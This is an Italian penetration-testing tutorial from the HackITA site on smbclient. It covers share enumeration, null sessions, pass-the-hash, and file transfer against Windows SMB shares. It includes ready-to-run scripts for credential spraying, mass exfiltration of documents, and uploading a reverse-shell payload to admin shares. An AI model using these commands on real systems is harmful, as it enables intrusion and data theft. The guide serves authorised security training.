---
title: 'Smbclient: Accesso e Attacco Alle Condivisioni Windows'
slug: smbclient
description: 'Con smbclient puoi accedere, leggere e scrivere file su condivisioni SMB. Scopri come usarlo per attacchi interni, enumeration e pivoting in AD.'
image: /smbcliehnt.webp
draft: false
date: 2026-01-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - smbclient
  - smb
---

# Smbclient: Accesso e Attacco Alle Condivisioni Windows

Smbclient è un client a riga di comando per il protocollo SMB/CIFS che permette l'interazione con condivisioni Windows da sistemi Linux e Unix. Sviluppato come componente della suite Samba, questo strumento offre un'interfaccia simile a FTP per accedere a risorse di rete Microsoft, trasferire file ed enumerare servizi esposti su host Windows.

Nel contesto del penetration testing, smbclient rappresenta uno degli strumenti fondamentali per la fase di reconnaissance e lateral movement in ambienti Active Directory. La sua capacità di testare configurazioni di sicurezza, enumerare share accessibili e stabilire connessioni autenticate o anonime lo rende essenziale per ogni security professional.

## Cos'è Smbclient e Perché è Cruciale

Smbclient implementa un client completo per il protocollo Server Message Block, lo standard utilizzato da Windows per la condivisione di file, stampanti e altre risorse di rete. A differenza di strumenti puramente enumerativi, smbclient permette interazione completa con i servizi SMB.

**Capacità distintive:**

* Enumerazione completa delle condivisioni di rete
* Connessione autenticata e anonima (null session)
* Trasferimento bidirezionale di file e directory
* Esecuzione di comandi remoti su share amministrative
* Creazione di archivi tar per backup massicci
* Supporto per autenticazione Kerberos e NTLM
* Modalità interattiva e non-interattiva per scripting

L'approccio "FTP-like" rende smbclient intuitivo per chiunque abbia familiarità con client di trasferimento file tradizionali, riducendo la curva di apprendimento.

## Architettura Protocollo SMB/CIFS

### Evoluzione Protocollo

Il protocollo SMB ha subito diverse revisioni nel corso degli anni:

| Versione    | Sistema Operativo  | Caratteristiche        | Sicurezza              |
| ----------- | ------------------ | ---------------------- | ---------------------- |
| SMB1 (CIFS) | Windows 2000/XP    | Legacy, molti dialetti | Vulnerabile, deprecato |
| SMB2        | Windows Vista/2008 | Performance migliorate | Signing opzionale      |
| SMB2.1      | Windows 7/2008 R2  | Oplocks migliorati     | Encryption supportata  |
| SMB3        | Windows 8/2012+    | Encryption end-to-end  | Mandatory signing      |

Smbclient supporta tutti i dialetti SMB, permettendo comunicazione con sistemi legacy e moderni. Questa compatibilità è cruciale durante assessment su reti eterogenee.

### Porte e Servizi

SMB opera principalmente su queste porte:

```
TCP 445 - SMB diretto (Direct Host)
TCP 139 - SMB su NetBIOS
UDP 137 - NetBIOS Name Service
UDP 138 - NetBIOS Datagram Service
```

La porta 445 è il target primario per connessioni moderne, mentre la 139 è utilizzata per retrocompatibilità con sistemi più datati.

## Installazione e Verifica Disponibilità

### Check Presenza Sistema

Prima di installare, verifica se smbclient è già disponibile:

```bash
which smbclient
smbclient --version
```

### Installazione su Distribuzioni Linux

**Debian/Ubuntu/Kali:**

```bash
sudo apt update
sudo apt install smbclient
```

**RHEL/CentOS/Fedora:**

```bash
sudo yum install samba-client
```

**Arch Linux:**

```bash
sudo pacman -S smbclient
```

La maggior parte delle distribuzioni orientate al penetration testing (Kali, Parrot, BlackArch) includono smbclient preinstallato.

### Verifica Installazione

Dopo l'installazione, conferma la disponibilità:

```bash
smbclient -h
```

L'output mostrerà tutte le opzioni disponibili e la sintassi corretta.

## Sintassi Fondamentale e Opzioni Critiche

### Struttura Comando Base

```bash
smbclient //HOST/SHARE [opzioni]
```

**Nota importante sullo slash:** La shell Unix interpreta il backslash come escape character. Esistono tre modalità per specificare percorsi Windows:

```bash
# Metodo 1: Doppio backslash
smbclient \\\\192.168.1.100\\C$

# Metodo 2: Quote singole
smbclient '\\192.168.1.100\C$'

# Metodo 3: Forward slash (funziona sempre)
smbclient //192.168.1.100/C$
```

Il terzo metodo (forward slash) è raccomandato per semplicità e compatibilità.

### Parametri Operativi Essenziali

```bash
-L [HOST]         # Lista tutte le condivisioni disponibili
-U [username]     # Specifica username per autenticazione
-N                # Null session (no password)
-W [workgroup]    # Specifica workgroup o dominio
-I [IP]           # Connessione diretta a IP specifico
-p [porta]        # Porta personalizzata (default 445)
-c 'comando'      # Esegue comando singolo non-interattivo
-d [0-10]         # Debug level (verbose output)
-k                # Usa autenticazione Kerberos
-m [protocol]     # Specifica versione protocollo SMB
```

### Opzioni Autenticazione Avanzate

```bash
--pw-nt-hash      # Autentica con hash NTLM (pass-the-hash)
--password-file   # Legge password da file
--client-protection=off  # Disabilita encryption SMB3
```

## Enumerazione Share e Reconnaissance

### Listing Share Anonimo

La prima fase di qualsiasi assessment SMB è l'enumerazione delle condivisioni disponibili:

```bash
smbclient -L //192.168.1.100 -N
```

Questo comando tenta un null session per listare tutte le share esposte senza autenticazione.

**Output tipico:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Users           Disk      User home directories
```

### Enumerazione Autenticata

Con credenziali valide, ottieni visibilità su share aggiuntive:

```bash
smbclient -L //192.168.1.100 -U amministratore
```

Dopo aver inserito la password, vedrai tutte le condivisioni accessibili con quel livello di privilegio.

### Identificazione Share Amministrative

Le share con sufisso `$` sono condivisioni amministrative nascoste:

* **ADMIN$** - Directory Windows/System32
* **C$, D$** - Root delle partizioni
* **IPC$** - Inter-Process Communication (null session tradizionale)

L'accesso a queste richiede privilegi amministrativi sul target.

Scopri cos'è [SMB](https://hackita.it/articoli/smb) e come testarne la sicurezza nella nostra guida approfondita.

## Modalità Connessione e Interazione

### Connessione Interattiva Base

Stabilisci una sessione FTP-like con una share:

```bash
smbclient //192.168.1.100/Users -U john
```

Una volta connesso, ricevi un prompt `smb: \>` dove puoi eseguire comandi interattivi.

**Comandi disponibili nel prompt interattivo:**

```
ls                # Lista contenuti directory corrente
cd [directory]    # Cambia directory
lcd [path]        # Cambia directory locale (client)
get [file]        # Scarica file
put [file]        # Carica file
mget [pattern]    # Scarica multipli file
mput [pattern]    # Carica multipli file
mkdir [nome]      # Crea directory
rmdir [nome]      # Rimuovi directory
del [file]        # Elimina file
prompt            # Toggle prompt per operazioni multiple
recurse           # Toggle ricorsione per mget/mput
help              # Mostra tutti i comandi disponibili
exit              # Chiudi sessione
```

### Esecuzione Comandi Non-Interattivi

Per scripting e automazione, usa il flag `-c`:

```bash
smbclient //192.168.1.100/Documents -U admin -c 'ls'
```

Questo esegue il comando `ls` e termina immediatamente, ideale per pipeline e script bash.

### Null Session Testing

Le null session permettono connessioni anonime a share mal configurate:

```bash
smbclient //192.168.1.100/IPC$ -N
```

Se la connessione ha successo, il sistema è vulnerabile a enumerazione anonima. Questa tecnica è particolarmente efficace su sistemi Windows legacy (2000/XP/2003).

## Trasferimento File e Gestione Dati

### Download Singolo File

Dalla modalità interattiva:

```bash
smb: \> get confidential.docx
```

Oppure in modalità non-interattiva:

```bash
smbclient //192.168.1.100/Documents -U admin -c 'get report.pdf'
```

Il file viene scaricato nella directory di lavoro corrente del client.

### Upload File su Share Remote

Carica un file locale sulla condivisione:

```bash
smb: \> put /tmp/payload.exe
```

Versione non-interattiva:

```bash
smbclient //192.168.1.100/Public -U guest -c 'put exploit.sh'
```

### Download Ricorsivo Completo

Per scaricare intere directory structure:

```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Questo scarica ricorsivamente tutti i file e sottodirectory mantenendo la struttura originale.

**Versione one-liner:**

```bash
smbclient //target/share -U user -c 'recurse;prompt;mget *'
```

### Gestione Directory Remote

Crea nuove directory:

```bash
smb: \> mkdir backup_2024
```

Naviga tra directory:

```bash
smb: \> cd Projects/Active
smb: \Projects\Active\> ls
```

Elimina file e directory:

```bash
smb: \> del obsolete.txt
smb: \> rmdir old_folder
```

## Tecniche di Autenticazione Avanzate

### Autenticazione Standard NTLM

Modalità più comune con username e password:

```bash
smbclient //192.168.1.100/C$ -U DOMAIN/administrator
```

Il sistema chiederà la password interattivamente. Per evitare il prompt:

```bash
smbclient //192.168.1.100/C$ -U administrator%P@ssw0rd123
```

**Attenzione:** Questo metodo espone la password nella command line history.

Per capire come funziona **[NTLM](https://hackita.it/articoli/ntlm)** il protocollo di autenticazione di Windows dietro SMB, e come sfruttarne le vulnerabilità, leggi la nostra guida completa:

### Autenticazione con File Credenziali

Metodo più sicuro per scripting:

```bash
echo "password_sicura" > /tmp/creds.txt
chmod 600 /tmp/creds.txt
smbclient //192.168.1.100/Share -U admin --password-file=/tmp/creds.txt
```

### Pass-the-Hash Attack

Se hai ottenuto un hash NTLM durante l'assessment:

```bash
smbclient //192.168.1.100/C$ -U administrator --pw-nt-hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

Questa tecnica bypassa la necessità della password in chiaro, utilizzando direttamente l'hash per l'autenticazione.

### Autenticazione Kerberos

In ambienti Active Directory configurati correttamente:

```bash
# Prima ottieni un ticket Kerberos
kinit administrator@DOMAIN.LOCAL

# Poi connetti usando il ticket
smbclient //server.domain.local/share -k
```

L'opzione `-k` indica a smbclient di utilizzare il ticket Kerberos invece di NTLM.

Per approfondire **[Kerberos](https://hackita.it/articoli/kerberos)** il principale protocollo di autenticazione negli ambienti Active Directory, leggi la guida completa:

### Specifica Dominio Windows

Per reti con Active Directory:

```bash
smbclient //192.168.1.100/Share -U CORP/john.doe
```

Oppure usando il formato UPN:

```bash
smbclient //192.168.1.100/Share -U john.doe@corp.local
```

## Operazioni Avanzate: Tar Backup e Restore

### Creazione Backup Tar

Smbclient include funzionalità native per creare archivi tar di condivisioni remote:

```bash
smbclient //192.168.1.100/Documents -U admin -Tc backup_docs.tar '*'
```

Il flag `-Tc` significa:

* `-T` = modalità tar
* `c` = create (crea archivio)

**Backup directory specifica:**

```bash
smbclient //192.168.1.100/C$ -U admin -Tc backup.tar 'Users/john/Desktop/*'
```

### Restore da Archivio Tar

Per ripristinare file da un backup tar:

```bash
smbclient //192.168.1.100/Restore -U admin -Tx backup_docs.tar
```

Il flag `-Tx` significa:

* `-T` = modalità tar
* `x` = extract (estrai archivio)

**Restore selettivo:**

```bash
smbclient //192.168.1.100/C$ -U admin -Tx backup.tar './Documents/important.xlsx'
```

Questo ripristina solo il file specifico dall'archivio.

### Uso in Modalità Interattiva

Attiva la modalità tar durante una sessione:

```bash
smb: \> tarmode
smb: \> recurse
smb: \> prompt OFF
smb: \> mget Projects/
```

Questo scarica l'intera directory Projects come archivio tar.

## Mounting Persistente con Smbmount

### Montaggio Manuale Share

Per accesso persistente a una condivisione Windows:

```bash
smbmount //192.168.1.100/Documents /mnt/windows_docs -o username=john
```

Dopo aver inserito la password, la share sarà accessibile come normale directory locale in `/mnt/windows_docs`.

### Alternativa con Mount Standard

Sintassi equivalente usando il comando `mount` nativo:

```bash
mount -t cifs //192.168.1.100/Documents /mnt/windows_docs -o username=john,password=secret
```

### Opzioni Avanzate Mount

```bash
mount -t cifs //192.168.1.100/Share /mnt/share -o username=admin,domain=CORP,uid=1000,gid=1000,file_mode=0755,dir_mode=0755
```

Parametri importanti:

* `uid/gid` - Ownership dei file montati
* `file_mode/dir_mode` - Permessi Unix per file e directory
* `domain` - Dominio Windows per autenticazione
* `vers=3.0` - Forza versione protocollo SMB

### Configurazione Persistente in /etc/fstab

Per mounting automatico al boot:

```bash
echo "//192.168.1.100/Share /mnt/share cifs username=user,password=pass,uid=1000 0 0" >> /etc/fstab
```

**Versione sicura con file credenziali:**

```bash
# Crea file credenziali
echo "username=john" > /root/.smbcredentials
echo "password=secret" >> /root/.smbcredentials
echo "domain=CORP" >> /root/.smbcredentials
chmod 600 /root/.smbcredentials

# Aggiungi a fstab
echo "//192.168.1.100/Share /mnt/share cifs credentials=/root/.smbcredentials,uid=1000 0 0" >> /etc/fstab
```

### Unmount Condivisione

```bash
umount /mnt/windows_docs
# oppure
smbumount /mnt/windows_docs
```

## Scenari Operativi Penetration Testing

### Scenario 1: Enumerazione Iniziale Post-Discovery

Dopo aver identificato host Windows con Nmap:

```bash
# Verifica porte SMB aperte
nmap -p445,139 192.168.1.0/24 --open

# Enumera share per ogni host trovato
for ip in $(cat smb_hosts.txt); do
    echo "[*] Enumerating $ip"
    smbclient -L //$ip -N 2>/dev/null
done
```

### Scenario 2: Null Session Exploitation

Testa vulnerabilità null session su range IP:

```bash
#!/bin/bash
for ip in 192.168.1.{1..254}; do
    smbclient -L //$ip -N 2>&1 | grep -v "Connection\|failed" && echo "[+] Null session: $ip"
done
```

### Scenario 3: Credential Spraying

Test credenziali comuni su share:

```bash
#!/bin/bash
USERS="admin administrator guest"
SHARES="C$ ADMIN$ IPC$"
PASSWORD="Password123"

for user in $USERS; do
    for share in $SHARES; do
        echo "[*] Testing $user on //$TARGET/$share"
        smbclient //$TARGET/$share -U $user%$PASSWORD -c 'ls' 2>&1 | grep -q "smb:" && echo "[+] Success: $user:$PASSWORD"
    done
done
```

### Scenario 4: Data Exfiltration

Esfiltrazione massiva di documenti sensibili:

```bash
# Connetti e scarica ricorsivamente tutti i documenti
smbclient //target/FileServer -U compromised_user -c 'recurse;prompt;mget *.docx *.xlsx *.pdf'

# Crea backup tar completo
smbclient //target/Confidential -U admin -Tc exfil_$(date +%F).tar '*'
```

### Scenario 5: Lateral Movement con Share Amministrative

Dopo aver compromesso credenziali admin:

```bash
# Accedi a C$ della vittima
smbclient //victim_pc/C$ -U DOMAIN/administrator

# Carica payload
smb: \> cd Windows\Temp
smb: \Windows\Temp\> put reverse_shell.exe
smb: \Windows\Temp\> exit

# Esegui con psexec o altro metodo
```

## Troubleshooting e Edge Cases

### Problema: Connection Timeout

**Sintomo:**

```
Connection to 192.168.1.100 failed (Error NT_STATUS_IO_TIMEOUT)
```

**Soluzioni:**

```bash
# Verifica connettività di base
ping 192.168.1.100
telnet 192.168.1.100 445

# Verifica firewall locale
sudo iptables -L -n | grep 445

# Testa porta alternativa (139)
smbclient -L //192.168.1.100 -p 139 -N
```

### Problema: Access Denied

**Sintomo:**

```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

**Cause comuni:**

* Credenziali errate
* Share richiede permessi specifici
* Account lockout policy attiva
* Firewall Windows blocca connessione

**Verifica:**

```bash
# Test credenziali su share differente
smbclient -L //target -U username

# Verifica account lockout
rpcclient -U username target -c 'getusrdompwinfo'
```

### Problema: Protocol Negotiation Failed

**Sintomo:**

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

**Causa:** Mismatch versione protocollo SMB.

**Soluzione:**

```bash
# Forza SMB1 (sistemi legacy)
smbclient //target/share -U user --option='client min protocol=NT1'

# Forza SMB2
smbclient //target/share -U user -m SMB2

# Forza SMB3
smbclient //target/share -U user -m SMB3
```

### Problema: Character Encoding Issues

Per sistemi con encoding non-UTF8:

```bash
# Specifica codepage
smbclient //target/share -U user --option='dos charset=CP850'
```

### Problema: Large File Transfer Failures

Per file molto grandi:

```bash
# Incrementa buffer size
smbclient //target/share -U user --option='client max protocol=SMB3' --option='client ipc max protocol=SMB3'
```

### Debugging Avanzato

Attiva logging dettagliato:

```bash
# Debug level 3 (raccomandato)
smbclient //target/share -U user -d 3

# Debug level 10 (verboso completo)
smbclient //target/share -U user -d 10 2>&1 | tee debug.log
```

## Utilizzo Tool Correlati: Nmblookup

### Identificazione NetBIOS Names

Nmblookup permette risoluzione nomi NetBIOS:

```bash
nmblookup -A 192.168.1.100
```

**Output tipico:**

```
Looking up status of 192.168.1.100
    FILESERVER      <00> -         B <ACTIVE> 
    WORKGROUP       <00> - <GROUP> B <ACTIVE> 
    FILESERVER      <20> -         B <ACTIVE> 
    WORKGROUP       <1e> - <GROUP> B <ACTIVE> 
    ADMINISTRATOR   <03> -         B <ACTIVE>
```

**Interpretazione codici:**

* `<00>` - Workstation Service
* `<03>` - Messenger Service (utente loggato)
* `<20>` - File Server Service
* `<1e>` - Browser Service Elections

### Identificazione Master Browser

```bash
nmblookup -M -- -
```

Questo identifica quali host sono master browser sulla rete locale.

### Risoluzione Nome NetBIOS

```bash
nmblookup FILESERVER
```

Restituisce l'IP associato al nome NetBIOS specificato.

## Tabella Operativa Comandi Essenziali

| Obiettivo                  | Comando                                                       | Autenticazione  | Output Atteso                 |
| -------------------------- | ------------------------------------------------------------- | --------------- | ----------------------------- |
| Enumerazione share anonima | `smbclient -L //target -N`                                    | Null session    | Lista share pubbliche         |
| Enumerazione autenticata   | `smbclient -L //target -U user`                               | Credenziali     | Lista completa share          |
| Connessione interattiva    | `smbclient //target/share -U user`                            | Credenziali     | Prompt `smb: \>`              |
| Download singolo file      | `smbclient //target/share -U user -c 'get file.txt'`          | Credenziali     | File scaricato localmente     |
| Upload file                | `smbclient //target/share -U user -c 'put local.exe'`         | Credenziali     | File caricato su share        |
| Download ricorsivo         | `smbclient //target/share -U user -c 'recurse;prompt;mget *'` | Credenziali     | Directory completa scaricata  |
| Backup tar remoto          | `smbclient //target/share -U user -Tc backup.tar '*'`         | Credenziali     | Archivio tar creato           |
| Restore tar                | `smbclient //target/share -U user -Tx backup.tar`             | Credenziali     | File estratti su share        |
| Pass-the-hash              | `smbclient //target/C$ -U admin --pw-nt-hash [hash]`          | Hash NTLM       | Accesso con hash              |
| Kerberos auth              | `smbclient //target/share -k`                                 | Ticket Kerberos | Autenticazione trasparente    |
| Mount persistente          | `mount -t cifs //target/share /mnt -o user=admin`             | Credenziali     | Share montata come filesystem |
| Lista directory            | `smbclient //target/share -U user -c 'ls'`                    | Credenziali     | Contenuto directory           |
| Crea directory             | `smbclient //target/share -U user -c 'mkdir folder'`          | Credenziali     | Directory creata              |
| Elimina file               | `smbclient //target/share -U user -c 'del file.txt'`          | Credenziali     | File eliminato                |
| Test null session IPC$     | `smbclient //target/IPC$ -N`                                  | Null session    | Connessione riuscita/fallita  |

## Checklist Operativa Pre-Assessment

Prima di utilizzare smbclient in un penetration test:

* Verifica autorizzazione scritta per il testing
* Documenta scope e target IP/hostname
* Verifica connettività di rete (ping, traceroute)
* Testa porte SMB aperte (445, 139)
* Enumera share con null session prima
* Prepara wordlist credenziali se richiesto
* Configura logging per tutte le attività
* Testa credenziali su share non-critiche prima
* Verifica spazio disco disponibile per exfiltration
* Prepara metodi alternativi (rpcclient, enum4linux)
* Documenta ogni tentativo di accesso
* Configura timeout appropriati per evitare detection
* Valuta impatto di operazioni massive (mget)
* Prepara piano di cleanup post-assessment
* Verifica requisiti per pass-the-hash se necessario

## FAQ Tecniche Smbclient

**Qual è la differenza tra smbclient e altri tool SMB come enum4linux?**

Smbclient è un client completo per interazione diretta con share, mentre enum4linux è uno script wrapper che automatizza enumerazione usando multipli tool (incluso smbclient). Smbclient offre controllo granulare, enum4linux automatizza discovery.

**Posso usare smbclient per eseguire comandi remoti?**

Smbclient non esegue comandi arbitrari direttamente. Puoi caricare file su share amministrative (C$, ADMIN$) ma l'esecuzione richiede tool aggiuntivi come psexec, wmiexec o smbexec della suite Impacket.

**Il pass-the-hash con smbclient funziona su tutti i sistemi Windows?**

Funziona su sistemi che accettano autenticazione NTLM. Windows moderni con mitigazioni patch KB2871997 applicata possono bloccare PTH su account locali (eccetto RID 500). Funziona sempre su account di dominio.

**Come posso evitare che le password appaiano nella command history?**

Usa file credenziali con `--password-file` oppure imposta la variabile d'ambiente `PASSWD` prima di eseguire smbclient. Mai usare formato `user%password` in script.

**Smbclient supporta SMB signing e encryption?**

Sì. SMB signing è supportato automaticamente se richiesto dal server. SMB3 encryption è supportata nelle versioni recenti. Usa `--client-protection=encrypt` per forzare encryption.

**Perché ricevo "protocol negotiation failed" anche con credenziali corrette?**

Probabilmente c'è mismatch tra versioni protocollo supportate. Windows moderni disabilitano SMB1 per sicurezza. Usa `-m SMB2` o `-m SMB3` per forzare protocolli moderni, oppure `--option='client min protocol=NT1'` per legacy.

**Posso automatizzare smbclient in script bash per assessment massivi?**

Assolutamente sì. Usa modalità non-interattiva con `-c` per singoli comandi. Per operazioni complesse, crea file di comandi e usa redirection: `smbclient //target/share -U user < commands.txt`.

**Come gestisco share con spazi nel nome?**

Usa quote: `smbclient '//target/Share Name' -U user` oppure escape: `smbclient //target/Share\ Name -U user`.

**Smbclient logga le attività da qualche parte?**

Di default no. Usa redirection per logging: `smbclient [...] 2>&1 | tee session.log` oppure incrementa debug level `-d 3` per output verboso.

**Qual è la migliore pratica per exfiltration massiva durante un pentest?**

Usa tar mode per efficienza: `smbclient //target/share -U user -Tc exfil.tar '*'`. Questo crea un singolo archivio, riducendo numero di connessioni e facilitando analisi post-assessment.

***

**Disclaimer Legale:** Smbclient è uno strumento legittimo per amministrazione sistemi e penetration testing autorizzato. L'utilizzo non autorizzato su reti e sistemi non di proprietà costituisce reato penale. Ottenere sempre permesso esplicito scritto prima di condurre assessment di sicurezza. Questo contenuto è esclusivamente educativo per professionisti della sicurezza informatica.

## HackITA — Supporta la Crescita della Formazione Offensiva

Se questo contenuto ti è stato utile e vuoi contribuire alla crescita di HackITA, puoi supportare direttamente il progetto qui:

👉 [https://hackita.it/supporta](https://hackita.it/supporta)

Il tuo supporto ci permette di sviluppare lab realistici, guide tecniche avanzate e scenari offensivi multi-step pensati per professionisti della sicurezza.

***

## Vuoi Testare la Tua Azienda o Portare le Tue Skill al Livello Successivo?

Se rappresenti un’azienda e vuoi valutare concretamente la resilienza della tua infrastruttura contro attacchi mirati, oppure sei un professionista/principiante che vuole migliorare con simulazioni reali:

👉 [https://hackita.it/servizi](https://hackita.it/servizi)

Red Team assessment su misura, simulazioni complete di kill chain e percorsi formativi avanzati progettati per ambienti enterprise reali.
